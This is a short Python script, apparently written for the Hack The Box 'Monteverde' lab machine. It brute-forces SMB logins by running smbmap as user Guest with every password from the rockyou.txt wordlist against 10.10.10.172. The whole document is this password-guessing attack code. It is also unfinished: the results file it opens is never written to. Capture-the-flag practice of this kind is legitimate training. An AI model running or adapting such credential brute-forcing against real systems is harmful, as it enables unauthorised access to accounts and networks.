import subprocess

with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    passwords = f.readlines()

w =  open("/home/davinci/htb/Monteverde/resultMap.txt", "w", errors="ignore")

for p in passwords:
    command = "smbmap -u Guest -p " + p + " -H 10.10.10.172"
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
    
    
